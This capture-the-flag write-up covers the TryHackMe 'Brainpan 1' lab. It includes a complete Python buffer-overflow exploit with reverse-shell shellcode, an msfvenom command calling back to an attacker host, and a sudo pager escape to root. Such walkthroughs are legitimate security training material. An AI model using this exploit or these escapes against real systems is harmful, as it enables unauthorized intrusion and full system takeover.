# Brainpan 1 - TryHackMe

> **Kill Chain Summary**: Perform directory fuzzing on an exposed HTTP service at port 10000 to uncover `/bin/brainpan.exe`, the binary running on custom TCP port 9999. Reverse engineer the executable to identify a stack-based buffer overflow with an instruction pointer (EIP) offset of 524 bytes, locate a reliable `JMP ESP` instruction address (`0x311712f3`) via Ghidra, and construct an exploit with NOP sled and encoded shellcode to achieve initial access as user `puck`. Finally, inspect `sudo -l` permissions to discover a custom administrative utility `/home/anansi/bin/anansi_util` running with root privileges, invoke its manual option to spawn the system pager (`man`/`less`), and break out via `!/bin/bash` to obtain root access.

| Property | Value |
| --- | --- |
| **Target Name** | Brainpan 1 |
| **Platform** | TryHackMe |
| **OS** | Linux (Ubuntu) |
| **Difficulty** | Hard |
| **Status** | Rooted |
| **Key Techniques** | Directory Fuzzing (Gobuster), Binary Reverse Engineering, Stack-Based Buffer Overflow (x86), Ghidra Disassembly (JMP ESP Search), msfvenom Shellcode Generation, Sudo GTFOBins Pager Escape (man / less) |

---

## 1. Reconnaissance and Enumeration

### TCP Port Scanning

A full TCP port scan was performed across the target host:

```bash
sudo nmap -p- -sS --min-rate 1000 -T4 -Pn $IP
```

**Port Scan Results:**

| Port | Service | Version / Details | Operational Role |
| --- | --- | --- | --- |
| **9999/tcp** | abyss | Custom Brainpan Banner Application | Vulnerable Custom Network Service |
| **10000/tcp** | http | SimpleHTTP/0.6 Python/2.7.3 | HTTP File Server |

### Web Application Enumeration (Port 10000)

Accessing `http://$IP:10000/` displays a static informational landing page.

Directory fuzzing was conducted using Gobuster:

```bash
gobuster dir -u http://$IP:10000/ -w /usr/share/wordlists/dirb/common.txt
```

**Discovered Endpoints:**
- `/bin/` (HTTP 301 / Directory Listing Enabled)

Navigating to `http://$IP:10000/bin/` revealed a downloadable binary file:
`brainpan.exe`

This executable is the identical program actively serving client connections on port 9999. The binary was downloaded to the local analysis machine for reverse engineering and vulnerability research.

---

## 2. Initial Access

### Binary Analysis and Vulnerability Research

Connecting to the service on port 9999 via Netcat:

```bash
nc $IP 9999
```

Output:
```text
_| _| _| _| 
_|_|_| _| _|_| _|_|_| _|_|_| _|_|_| _|_|_| _|_|_| 
_| _| _| _| _| _| _| _| _| _| _| _| 
_|_|_| _| _| _|_|_| _| _| _|_|_| _|_|_| _| _| 
[________________________ WELCOME TO BRAINPAN _________________________]
 enter password:
```

The service prompts for a password and reads user input into a local buffer.

Running the binary locally under Wine and inspecting string handling routines in a disassembler confirmed that input is read into a fixed-size buffer using an unsafe string copy operation without bounds validation, creating a classic stack-based buffer overflow vulnerability.

### Buffer Overflow Exploitation Sequence

#### 1. Offset Determination

Using pattern generation utilities (`msf-pattern_create -l 1000`) and analyzing the crash state under a debugger, the distance to overwrite the Extended Instruction Pointer (EIP) was determined:

- **EIP Offset**: **524 bytes**

#### 2. Locating a Reliable Return Address (`JMP ESP`)

To redirect execution to attacker-controlled shellcode on the stack, an address containing a `JMP ESP` (or `CALL ESP`) instruction was needed within a non-ASLR, non-rebased module.

Using Ghidra to analyze the PE headers and instructions of `brainpan.exe`:
- **Instruction**: `JMP ESP` (`\xff\xe4`)
- **Memory Address**: `0x311712f3`
- **Little Endian Representation**: `\xf3\x12\x17\x31`

Checking memory protection flags confirmed that `0x311712f3` resides in executable memory that does not contain null bytes (`\x00`).

#### 3. Payload Generation

Generating an x86 Linux reverse shell payload using `msfvenom` while excluding null bytes:

```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=192.168.129.253 LPORT=4444 -f c -b "\x00"
```

#### 4. Complete Exploit Script

An exploit script was assembled following the structure:
`Buffer = ('A' * 524) + EIP_Address + NOP_Sled + Shellcode + "\r\n"`

```python
#!/usr/bin/python3
import socket

ip = "10.128.145.164"
port = 9999

offset = 524
overflow = b"A" * offset
ret_address = b"\xf3\x12\x17\x31"  # 0x311712f3 in Little Endian
padding = b"\x90" * 32             # NOP Sled

# msfvenom linux/x86/shell_reverse_tcp
payload = (
    b"\xdb\xde\xd9\x74\x24\xf4\xbb\x7d\xca\xda\x24\x5d\x31\xc9"
    b"\xb1\x12\x31\x5b\x17\x83\xc3\x04\x03\x5b\x13\x64\x72\x05"
    b"\x56\x03\x38\xbf\x87\x55\x85\x3e\xd7\x94\xd4\x51\xee\x24"
    b"\x57\x15\x4c\x5b\x06\x65\x7f\x83\xa1\x18\x6f\x18\x67\x41"
    b"\xa2\xa9\x6b\x82\x90\x08\x12\xdd\x08\x91\xd1\x8c\x83\x1d"
    b"\x06\x97\xef\x7d\x82\xad\x59\x7c\x4f\xee\xef\xad\xeb\x5e"
    b"\x12\xfa\x68\xae\xa2\xee\x88\x8c\xae\xf2\x35\x05\x52\x98"
)

buffer = overflow + ret_address + padding + payload + b"\r\n"

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    print(f"[*] Connecting to {ip}:{port}...")
    s.connect((ip, port))
    s.recv(1024)
    print("[*] Sending buffer overflow payload...")
    s.send(buffer)
    print("[+] Exploit sent successfully.")
except Exception as e:
    print(f"[-] Connection failed: {e}")
finally:
    s.close()
```

#### Exploit Execution

A Netcat listener was opened on Kali:

```bash
nc -lvnp 4444
```

Running `exploit.py` successfully redirected execution flow:

```bash
python3 exploit.py
```

The listener caught the reverse shell:

```bash
connect to [192.168.129.253] from (UNKNOWN) [10.128.145.164] 49190
id
uid=1002(puck) gid=1002(puck) groups=1002(puck)
whoami
puck
```

---

## 3. Privilege Escalation

### Sudo Permission Enumeration

Auditing sudo privileges for user `puck`:

```bash
sudo -l
```

Output:
```text
Matching Defaults entries for puck on brainpan:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User puck may run the following commands on this host:
    (root) NOPASSWD: /home/anansi/bin/anansi_util
```

User `puck` can execute `/home/anansi/bin/anansi_util` as root without supplying a password.

### Inspecting the Custom Administrative Binary

Executing the binary without arguments to inspect available options:

```bash
sudo /home/anansi/bin/anansi_util
```

Output:
```text
Usage: /home/anansi/bin/anansi_util [action]
Where [action] is one of:
  - network
  - proclist
  - manual [command]
```

### Privilege Escalation via Pager Breakout (GTFOBins)

The action `manual [command]` invokes the Linux `man` utility for the specified command (e.g., `man ls`).

By default, `man` pipes terminal output through a pager (`less` or `more`) when the displayed text exceeds terminal window dimensions. 

Pagers feature interactive command prompts where prefixing an exclamation mark (`!`) allows execution of arbitrary shell commands. Because `anansi_util` is executed via `sudo` with root privileges, commands spawned from within the pager inherit root authority.

#### Exploitation Procedure:

1. Executed the utility with manual mode:

```bash
sudo /home/anansi/bin/anansi_util manual ls
```

2. Once the manual page displayed inside the pager interface, typed:

```text
!/bin/bash
```

3. Pressed Enter.

The pager broke out into an unrestricted root shell:

```bash
root@brainpan:~# id
uid=0(root) gid=0(root) groups=0(root)
root@brainpan:~# whoami
root
```

The root flag was retrieved:

```bash
cat /root/bof.txt
[FLAG REDACTED]
```

---

## 4. Useful Commands Summary

```bash
# Directory Fuzzing for Application Binaries
gobuster dir -u http://$IP:10000/ -w /usr/share/wordlists/dirb/common.txt

# Generating x86 Reverse Shellcode with msfvenom
msfvenom -p linux/x86/shell_reverse_tcp LHOST=IP LPORT=PORT -f c -b "\x00"

# Sudo Permissions Audit
sudo -l

# Pager Shell Breakout Sequence (Inside less / man)
!/bin/sh
!/bin/bash
```

---

## 5. Key Takeaways and Lessons Learned

1. **Structured Buffer Overflow Methodology**:
   Stack-based buffer overflow development follows an invariant five-step procedure:
   - Identify buffer crash input size (fuzzing).
   - Calculate precise EIP overwrite offset (cyclic patterns).
   - Identify bad characters (byte array comparison).
   - Find static `JMP ESP` instructions in modules lacking memory protections (ASLR/DEP).
   - Generate shellcode, construct payload with NOP sled, and trigger execution.

2. **Web Directory Enumeration for Auxiliary Assets**:
   Whenever a target hosts a custom or unidentified network service on a high port, thoroughly fuzz all associated HTTP services. Developers frequently leave compiled binaries, debug builds, or source files in web directories (such as `/bin`, `/backup`, or `/download`).

3. **Terminal Pagers as Privilege Escalation Vectors**:
   Any administrative script running via `sudo` that invokes utilities using pagers (`man`, `less`, `more`), text editors (`vi`, `nano`), or debugging utilities (`gdb`) can be trivially escaped to a root shell using interactive escape characters (`!/bin/sh`).

---

#thm #linux #ubuntu #bof #buffer-overflow #x86 #reverse-engineering #ghidra #msfvenom #sudo #gtfobins #pager #less #man #hard
